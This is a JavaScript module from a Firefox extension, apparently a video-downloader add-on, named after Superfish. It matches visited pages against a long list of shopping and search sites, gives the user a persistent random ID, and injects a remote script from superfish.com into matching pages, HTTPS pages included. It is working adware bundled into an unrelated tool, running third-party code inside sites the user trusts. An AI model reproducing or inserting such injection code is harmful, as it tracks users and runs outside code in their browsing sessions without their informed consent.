var EXPORTED_SYMBOLS = ["fvd_single_Superfish"]; 

Components.utils.import("resource://fvd.single.modules/config.js");
Components.utils.import("resource://fvd.single.modules/settings.js");

// not used now
const AVAILABLE_LANGUAGES = [
	"en",
	"fr",
	"de",
	"mi"
];


const AVAILABLE_HOSTS = ["ebay","amazon","staples","apple","walmart","dell","officedepot","libertyinteractive","searsholdings",
		"signup.netflix","cdw","bestbuy","officemax","newegg","macysinc","grainger","sony","costco","llbean","bathandbodyworks",
		"jcpenney","shopping.hp","gapinc","target","williams-sonomainc","systemax","hsni","overstock","kohls","toysrusinc","amway",
		"shop.nordstrom","barnesandnoble","walgreens","redcats","vistaprint","buy","avon","saksfifthavenue","pcconnection","symantec",
		"neimanmarcusgroup","homedepot","cabelas","musiciansfriend","abercrombie","fanaticsinc","lowes","urbn","gilt","wayfair",
		"1800flowers","peapod","shutterfly","footlocker-inc","gamestop","jcrew","pcmall","elcompanies","crateandbarrel","ancestry",
		"weightwatchers","yooxgroup","scholastic","rei","ae","zones","fheg.follett","deluxe","ralphlauren","marketamerica","bluenile",
		"nikeinc","chicosfas","microsoft","1800contacts","usautoparts.net","orientaltrading","ftd","disneystore","freshdirect","build",
		"bluestembrands","greenmountaincoffee","ruelala","hayneedleinc","vitacost","http","info.cvscaremark","northerntool","shoebuy","shopnbc",
		"anninc","nutrisystem","sierratradingpost","basspro","shopmyexchange","ediblearrangements","eddiebauer","orchardbrands","hbc",
		"dickssportinggoods","express","ebags","colonybrands","restorationhardware","safeway","mlb.mlb","harryanddavid","vfc",
		"investors.coastalcontacts","childrensplace","cafepress","beachbody","aeropostale","americangirl","tiffany","art","drsfostersmith",
		"jr","1800petmeds","autozone","alibris","crutchfield","omahasteaks","nfl","zazzle","talbots","charmingshoppes",
		"alliedelec","shoplet","dillards","stores.lego","blockbuster","coldwatercreek","store.schoolspecialty","sephora","bigfishgames",
		"karmaloop","shoemall","fragrancenet","potpourrigroup","bodenusa","underarmour","shoes","luxottica","orvis","onlineshoes",
		"abt","theshoppingchannel","gamefly","finishline","nbty","sdcd","fansedge","brooksbrothers","autoanything","coach",
		"verabradley","deckers","lululemon","crucial","lifeway","bhphotovideo","opticsplanet","jtv","barneys","cooking",
		"ajmadison","ascenaretail","ideeli","onekingslane","beyondtherack","thinkgeek","benchmarkbrands","1saleaday","lampsplus",
		"bluefly","brookstone","hallmark","cymax","crocs","ross-simons","tempurpedic","motorcycle-superstore","iherb",
		"signetjewelers","bedbathandbeyond","zalecorp","panasonic","chapters.indigo.ca","emusic","http","fossil","overnightprints",
		"powerequipmentdirect","deliasinc","tore.delias","customink","dswinc","vitaminshoppe","personalizationmall","gnc",
		"goldeneaglecoin","bidz","wowhd","josbank","americangreetings","golfsmith","replacements","buckle","adidas",
		"furniture","skymall","ldproducts","compuplus","shoedazzle","hottopic","roadrunnersports","blinds","belk",
		"sweetwater","wolverineworldwide","monkeysports","sleepnumber","jomashop","databazaar","onecall","amerimark",
		"sportsauthority","petco","sundancecatalog","tabcom.org","hickoryfarms","zoostores","performancebike","hannaandersson",
		"livingdirect","toryburch","cheaperthandirt","nationalbusinessfurniture","ikea","bjs","store.discovery","geeks",
		"newbalance","wine","barenecessities","betterworldbooks","thompsongroup","zumiez","ecampus","instawares","vermontteddybear",
		"moviemars","columbia","timelife","frys","roomstogo","nyandcompany","teamexpress","cpooutlets","samashmusic","pacsun",
		"joann","smartpakequine","dermstore","vanns","ice","mileskimball","softchoice","godiva","chegg","radioshackcorporation",
		"moosejaw","lumberliquidators","bose","americanmusical","guess","propertyroom","bikebandit","boscovs","unbeatablesale",
		"hugoboss","americanapparel.net","sonicelectronix","menswearhouse","tractorsupply","hammacher","turn5","armaniexchange","yesasia",
		"techforless","christopherandbanks","babyage","meijer","containerstore","jpcycles","eforcity","partycity","folica","tillys",
		"stroll","uniquesquared","levenger","sheplers","jockey","fathead","chefscatalog","gaiam","westmarine","amiclubwear",
		"petsmart","nhl","aclens","diamondnexus","softmart","payless","fredericks","rockbottomgolf","ashford","textbooks",
		"gymboree","discountdance","doversaddlery","ngsgenealogy.org","callawaygolf","motherswork","lakeshorelearning","pcrush",
		"interworldhighway","tirllc","bareescentuals","thingsremembered","ulta","beallsinc","istoresinc","bodyc","philips",
		"forever21","directron","davidsbridal","shopperschoice","yankeecandle","toolking","superbiiz","discountofficeitems","bellacor",
		"ivgstores","buyonlinenow","chasing-fireflies","1800mattress","sheetmusicplus","beta.threadless","jjbuckley","lakeside","ntsupply",
		"lifetimebrands","klwines","charlotterusse","levistrauss","modcloth","parts-express","smoothfitness","campingworld","47stphoto",
		"bebe","nastygal","aedsuperstore","onlinestores","lafayette148ny","wetsealinc","paulfredrick","superwarehouse","garmin",
		"blissworld","stacksandstacks","spanx","us-mattress","amainhobbies","shop.advanceautoparts","rugsusa","jensonusa","burberry",
		"franklincovey","worldmarket","lids","restockit","xogroupinc","surlatable","leatherup","rugs-direct","irobot","booksamillioninc",
		"jefferspet","evo","sallybeauty","cpa2biz","rockler","aldogroup","toolfetch","thelimited","mec.ca","vintagetub","touchofclass",
		"beautyencounter","leapfrog","lancome-usa","carters","buyautoparts","balsambrands","tumi","powells","eileenfisher","ediets",
		"nationalbuildersupply","buildasign","everythingfurniture","peruvianconnection","idwholesaler","calendars","starbucks",
		"heartratemonitorsusa","printingforless","biblio","netdirectmerchants","artbeads","discountramps","nfm","christianbook",
		"altrec","reitmans","smartsign","myotcstore","jackthreads","skechers","hhgregg","actionvillage","highlandproductsgroup",
		"solidsignal","gifttree","alice","pureformulas","fab","spreadshirt","ozbo","inetvideo","ems","fatbraintoys","drillspot",
		"limogesjewelry","kennethcole","skincarerx","trollandtoad","bonton","entertainmentearth","coffeeforless","toolup","calumetphoto",
		"luggageonline","ehobbies","brickhousesecurity","kingarthurflour","store.nascar","shoppbs.org","beau-coup","3balls","cableorganizer",
		"danskin","envelopes","costumecraze","air-n-water","glassesusa","honeybaked","appliancezone","scentiments","royaldiscount",
		"bagborroworsteal","gourmetgiftbaskets","bootbarn","hamgo","airsplat","titlenine","canada.roots","shopecko","marcecko",
		"myjewelrybox","wwe","bostongreengoods","musicnotes","batteries","burton","jamesallenonf1","ustoy","ustoyco","summitonline", "google",
		"yahoo", "bing", "msn", "netflix","sears","groupon","macys","gap","livingsocial","zappos","multiply","tigerdirect","nordstrom",
		"qvc","victoriassecret","sky","hm","legacy","nike","pixmania","samsclub","ticketmaster","6pm","hsn","cvs","landsend","play",
		"souq","trademe.co.nz","autotrader","directv","cars","wiley","marksandspencer","drugstore","neimanmarcus","cduniverse","shopbop",
		"radioshack","snapfish","futureshop.ca","urbanoutfitters","shop.lego","williams-sonoma","net-a-porter","www1.bloomingdales",
		"potterybarn","stubhub","yoox","cambridge.org","redbubble","abebooks","threadless","adorama","backcountry","anthropologie","fingerhut",
		"dsw","nespresso","gifts","gunbroker","smilebox","adpost","tinyprints","techbargains","mapsofindia","oldnavy","uncommongoods","sportsmansguide",
		"midwayusa","lanebryant","famousfootwear","redenvelope","futurebazaar","hmv","carmax","bonanza","westelm","personalcreations","micromaxinfo","usfreeads",
		"boostmobile","moo","game.co.uk","academy","pier1","tirerack","cdbaby","gandermountain","zales","drjays","mobikwik","movietickets","swansonvitamins","womanwithin",
		"acehardware","grasscity","timberland","anntaylor","footballfanatics","cargurus","arcamax","watchuseek","zavvi","keurig","instyle","otterbox",
		"magazines","inetgiant","duluthtrading","frontgate","oup","mandmdirect","mycricket","shop.mlb","freepeople","oakley","proflowers","medcohealth",
		"vodafone.ie","tradepub","shopgoodwill","auctionzip","aafes","wickedweasel","autotrader.ca","summitracing","jcwhitney","lionbrand",
		"doubledaybookclub","zzounds","brownells","harrods","burlingtoncoatfactory","carsforsale","puritan","pandora.net","ebid.net",
		"tennis-warehouse","hermes","dickblick","jinx","skinit","homedecorators","minted","wetseal","apmex","lazerguard","cirquedusoleil",
		"landofnod","bergdorfgoodman","wbshop","chicos","vans","garnethill","informit","loccitane","businessesforsale","epage",
		"bkstr","shop.nationalgeographic","cardstore","rockauto","gohastings","reebok","bigbadtoystore","maccosmetics","stevemadden",
		"jjill","pbteen","gotprint.net","spencersonline","comet.co.uk","delias","sell","starcitygames","tivo","webclassifieds.us",
		"roamans","journeys","claires","toywiz","getjar","tickets","fender","kirklands","lulus","campmor","avenue","seacoast","jessops",
		"themobilestore.in","pennysaverusa","websun01.sasa","andysautosport","novica","woodcraft","clinique","beallsflorida",
		"seventhavenue","moma.org","jpc.de","venus","luckyvitamin","esprit","booksamillion","recycler","sharperimage","teavana",
		"ballarddesigns","greendust","ubid","whsmith.co.uk","converse","yandy","quill","tributes","funimation","torrid",
		"audiogon","figis","cheapsmells","swisscolony","qpb","domesticsale","kingsizedirect","rightstuf","ninewest","sunglasshut",
		"digitalrev","swimoutlet","hemmings","towerhobbies","forzieri","gojane","1000bulbs","the-house","dooney","warbyparker",
		"twopeasinabucket","schwans","tgw","leevalley","proxibid","bazaar-in-iran","mountainroseherbs","cdjapan.co.jp",
		"repairclinic","sees","nativeremedies","ebooks","sothebys","cinema.my","hobbytron","beprepared","broadway","zennioptical",
		"sideshowtoy","case-mate","juno.co.uk","napaonline","fredflare","philosophy","perpetualkid","snorgtees","symbios.pk","dyson",
		"christmascentral","catherines.lanebryant","bustedtees","onestepahead","worldsoccershop","motorcycle-usa","framesdirect",
		"gardeners","tupperware","gazelle","berries","racingjunk","samash","geebo","paper-source","shop.history","bricklink",
		"fragrancedirect.co.uk","budk","skinstore","colehaan","herroom","speckproducts","thebookpeople.co.uk"];

fvd_single_Superfish = new function(){
	
	function getUUID(){  
		
		var id = null;
		
		try{
			id = fvd_single_Settings.getStringVal("superfish_id");
		}
		catch( ex ){
			
		}
		
		if( id ){
			return id;
		}
	
        id = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {  
            var r = Math.random()*16|0, v = c == 'x' ? r : (r&0x3|0x8);  
            return v.toString(16);  
        }).toUpperCase();  
		
		fvd_single_Settings.setStringVal("superfish_id", id);
		
		return id;
		
    }

	
	function mainWindow(){
		var wm = Components.classes["@mozilla.org/appshell/window-mediator;1"]
		                   .getService(Components.interfaces.nsIWindowMediator);
		var mainWindow = wm.getMostRecentWindow("navigator:browser");
		
		return mainWindow;
	}
	
	function init(){
		
		mainWindow().document.getElementById( "appcontent" ).addEventListener( "DOMContentLoaded", function( e ){

			if( !fvd_single_Config.superfish ){
				return;
			}
			
			if( !fvd_single_Settings.getBoolVal("enable_superfish") ){
				return;
			}
						
			var win = e.target.defaultView;
		    if (win.wrappedJSObject){
				win = win.wrappedJSObject;				
			}
			
			var document = win.document;

			
			var host = document.location.host;
			host = host.toLowerCase().replace( "www.", "" );

			
			var hostAvailable = false;
			AVAILABLE_HOSTS.forEach(function( sign ){
				
				if( host.indexOf(sign) != -1 ){
					hostAvailable = true;
					return false;
				}
				
			});


			
			if( !hostAvailable ){
				return;
			}

			if( !win.superfish ){

				
				var userId = getUUID();

				
				var injectUrl = "http://www.superfish.com/ws/sf_main.jsp?dlsource=lwjyocpk&userId="+userId;
				
				if( document.location.href.indexOf("https:") === 0 ){
					injectUrl = "https://www.superfish.com/ws/sf_main.jsp?dlsource=lwjyocpk&userId="+userId;
				}
	
				var script = document.createElement("script");
				script.setAttribute( "src", injectUrl );
				document.head.appendChild( script );
				

				
			}
			
		} );
		
	}
	
	init();
	
}
